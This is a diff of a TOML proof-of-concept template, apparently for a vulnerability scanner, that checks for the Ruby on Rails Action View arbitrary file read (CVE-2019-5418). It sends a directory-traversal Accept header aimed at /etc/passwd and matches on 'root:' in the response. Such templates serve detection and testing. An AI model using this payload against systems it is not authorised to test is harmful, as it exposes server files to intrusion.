@@ -1,10 +1,10 @@
 [info]
 author = "ave"
-description = "验证 Ruby on Rails Action View 任意文件读取漏洞，通过构造恶意 Accept 请求头读取服务器任意文件"
+description = "Ruby on Rails Action View 文件内容泄露漏洞验证。通过在 HTTP 请求 Accept 头中注入目录遍历路径，检测目标系统是否存在任意文件读取漏洞。"
 id = "POC-AVE-2019-1306"
 name = "CVE-2019-5418 PoC"
 severity = "high"
-tags = ["ave-2019-1306"]
+tags = ["cve-2019-5418"]
 vuln_id = [
     "CVE-2019-5418",
     "AVE-2019-1306",
@@ -15,19 +15,19 @@ logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/etc/passwd"
+path = "/{{BaseURL}}"
 protocol = "http"
 
 [poc.requests.headers]
-Accept = "../../../../etc/passwd"
+Accept = "../../../../../../../../etc/passwd"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = ["root:"]
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
